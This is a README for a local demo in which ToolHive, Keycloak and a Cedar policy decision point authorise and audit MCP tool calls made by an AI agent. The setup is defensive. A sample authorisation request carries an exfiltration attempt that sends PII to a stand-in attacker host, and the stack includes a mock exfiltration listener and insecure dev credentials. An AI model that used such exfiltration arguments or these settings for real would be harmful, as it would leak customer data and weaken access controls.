# ToolHive runtime policy demo

**Claude Code → ToolHive (PEP) → Cedar PDP → MCP servers, with Keycloak identities and a full trace of every decision.**

An AI agent connects to MCP tools through ToolHive. Every tool call is
authenticated with a Keycloak token, judged by an external Cedar Policy
Decision Point, enforced by ToolHive, and recorded three times: in the PDP's
decision log (why), ToolHive's audit log (what was enforced) and Jaeger (the
trace).

Audience: developers and security teams. Runs on a laptop with Docker.
The presenter runbook is [DEMO.md](DEMO.md).

```
                 ┌──────────────┐   1. password grant (./demo.sh token)
                 │   Keycloak   │◄──────────────────────────────┐
                 │ realm        │   JWT: iss, aud, sub, roles    │
                 │ toolhive-demo│──────────────────────────────►│
                 └──────┬───────┘                                │
                        │ 3. JWKS (signing keys)          ┌──────┴──────┐
                        ▼                                 │ Claude Code │
 ┌──────────────────────────────────────────────┐ 2. MCP  │  (agent)    │
 │ ToolHive proxy = Policy Enforcement Point    │◄────────┤ Bearer JWT  │
 │  a. authenticate: signature, iss, aud, exp   │         └─────────────┘
 │     → 401 if invalid                         │
 │  b. parse JSON-RPC (tools/call get_customer) │ 4. POST /decision {principal,operation,resource,context}
 │  c. ask the PDP ─────────────────────────────┼──────────────►┌───────────────────────────┐
 │  d. enforce: forward, or 403                 │◄──────────────┤ Cedar PDP (pdp/)          │
 │  e. tools/list: drop tools the user may not  │ {"allow":bool}│ loads policies/*.cedar    │
 │     call (one PDP question per tool)         │               │ hot reload, decision log  │
 │  f. audit event + OpenTelemetry span         │               └───────────────────────────┘
 └───────┬───────────────────────┬──────────────┘
         ▼                       ▼                        audit log ──► ./demo.sh watch
 ┌───────────────┐     ┌──────────────────┐               spans ─────► Jaeger :16686
 │ acme-data MCP │     │ fetch MCP        │──X──► attacker :9999 (network profile)
 │ customer data │     │ egress allowlist │
 └───────────────┘     └──────────────────┘
```

## Who does what

| Role | Component | Notes |
|---|---|---|
| Identity provider | Keycloak (`keycloak/realm-toolhive-demo.json`) | Users, realm roles, an audience mapper (`aud: toolhive-demo`) and a mapper that copies realm roles to a top-level `roles` claim |
| Policy administration | `policies/*.cedar` in Git | Reviewed like code. The PDP reloads on save. |
| **Policy Decision Point** | `pdp/` (Go, [cedar-go](https://github.com/cedar-policy/cedar-go)) | Answers `POST /decision`. Knows the policies; never sees MCP traffic. |
| **Policy Enforcement Point** | ToolHive (`thv run … --authz-config config/authz-pdp.yaml`) | Authenticates, asks, enforces, filters, audits. Never sees the policies. |
| Evidence | PDP decision log, ToolHive audit log, Jaeger | `./demo.sh watch`, http://localhost:16686 |

### How ToolHive gets a decision

ToolHive's `httpv1` authorizer turns each MCP request into a **PORC**
(Principal, Operation, Resource, Context) and POSTs it to the PDP:

```json
{
  "principal": { "sub": "22222222-2222-4222-8222-222222222222", "roles": ["support", "default-roles-toolhive-demo"] },
  "operation": "mcp:tool:call",
  "resource":  "mrn:mcp:acme:tool:export_report",
  "context":   { "mcp": { "feature": "tool", "operation": "call", "resource_id": "export_report",
                          "args": { "destination": "https://paste.attacker.example/drop", "include_pii": true } } }
}
```

The PDP translates it into a Cedar request and answers `{"allow": false}`:

| PORC | Cedar |
|---|---|
| `principal.sub`, `principal.roles` | `User::"<sub>"` with parents `Role::"<role>"` and attribute `roles` |
| `operation` `mcp:tool:call` | `Action::"call_tool"` (same names as ToolHive's built-in Cedar mode) |
| `resource` `mrn:mcp:acme:tool:export_report` | `Tool::"export_report"` with parent `MCPServer::"acme"` |
| `context.mcp.args` | `context.args` |

Behaviour worth knowing, all confirmed against the ToolHive source:

- **No caching of answers.** Every `tools/call` is a fresh question, which is why a policy edit applies on the very next call.
- **`tools/list` is filtered**, not denied: ToolHive asks the PDP once per tool, *without arguments*. Argument rules are therefore written as `forbid … when { context has args && … }`, so they don't hide the tool.
- **`initialize` and `ping`** are always allowed; they never reach the PDP.
- **Fail closed.** If the PDP is unreachable or errors, the request is denied (try `./demo.sh pdp stop`).
- **What the PDP receives from the token:** with `claim_mapping: standard`, only `sub`, `roles`, `groups` and `scope(s)`. That is why the PDP maps Keycloak user IDs to display names from `config/display-names.json`.

## Prerequisites

| Tool | Notes |
|---|---|
| Docker (Desktop or Engine) with Compose v2 | Runs Keycloak, PDP, Jaeger, the attacker listener and the MCP server containers |
| [ToolHive CLI](https://github.com/stacklok/toolhive) `thv` | `brew install stacklok/tap/thv`, or a release binary. The ToolHive desktop UI is optional (used in Act 0). |
| [Claude Code](https://claude.com/claude-code) | `claude` on your PATH |
| `curl`, `python3` (3.9+), `bash` | No Python packages needed |

Free ports: 8080 (Keycloak), 9191 (PDP), 16686/4317/4318 (Jaeger), 9999
(attacker), 8301/8302 (ToolHive proxies).

## Quick start

```bash
cd toolhive-demo
./demo.sh up          # ~1 min the first time (image pulls, Keycloak boot)
./demo.sh check       # end-to-end verification of every policy outcome, no agent
./demo.sh watch       # in a second terminal: the live decision feed
./demo.sh claude support-bot
```

Users (password `demo`):

| User | Keycloak roles | Sees on `acme` | Sees on `fetch` |
|---|---|---|---|
| `alice` | `engineer` | everything | `fetch` (approved hosts only) |
| `support-bot` | `support` | `list_customers`, `get_customer`, `update_ticket` | nothing |
| `bob` | none | `list_customers`, `get_customer` | nothing |

Admin console: http://localhost:8080/admin (`admin` / `admin`).

## Commands

```
./demo.sh up | down | status
./demo.sh token <user>              raw access token
./demo.sh decode <user|token>       iss / aud / sub / roles / exp
./demo.sh claude <user>             Claude Code wired to ToolHive as <user>
./demo.sh tools <user> [server]     tools visible to <user>
./demo.sh call <user> <server> <tool> '<json args>'
./demo.sh forged                    self-signed "alice" token → 401
./demo.sh guardrails on|off         with / without the PDP (authentication stays on)
./demo.sh network locked|open       fetch egress allowlist on / off
./demo.sh pdp stop|start            show fail-closed
./demo.sh role add|remove <user> <role>
./demo.sh policies                  what the PDP has loaded
./demo.sh watch [pdp|pep]           live decision feed
./demo.sh attacker                  anything here is a leak
./demo.sh check                     automated verification
```

## Repository layout

```
demo.sh                     the driver
docker-compose.yml          Keycloak, PDP, Jaeger, attacker
keycloak/                   realm import (users, roles, client, mappers)
policies/mcp.cedar          the policies (edit live)
pdp/                        external Cedar PDP (Go) + tests
config/authz-pdp.yaml       ToolHive → PDP wiring (httpv1)
config/audit.template.json  ToolHive audit log settings
config/fetch-*-profile.json network permission profiles for fetch
servers/acme-data/          demo MCP server (Python, stdio) + smoke test
scripts/mcp_call.py         tiny MCP client used by demo.sh
scripts/watch.py            decision feed (PDP + ToolHive audit)
clients/                    Claude Code .mcp.json template and CLAUDE.md
attacker/listener.py        pretend exfiltration endpoint
```

## Tests

```bash
cd pdp && go test ./...                                   # policy outcomes, hot reload, fail-safe parsing
python3 servers/acme-data/test_server.py                  # needs: pip install mcp==1.30.0
./demo.sh check                                           # full stack, after ./demo.sh up
```

## Safety notes

This is a local demo. Keycloak runs in dev mode over HTTP, so ToolHive is
started with `--oidc-insecure-allow-http` and `--jwks-allow-private-ip`; the
token helper uses the password grant; all passwords are `demo`/`admin`. Do
not reuse these settings in production. All customer data is fictional and
nothing is sent to a real external host.

Inspired by [ChrisJBurns/toolhive-cedar-demo](https://github.com/ChrisJBurns/toolhive-cedar-demo),
which shows the Kubernetes operator and static Cedar analysis. This demo
focuses on the CLI, an external PDP and runtime evidence.
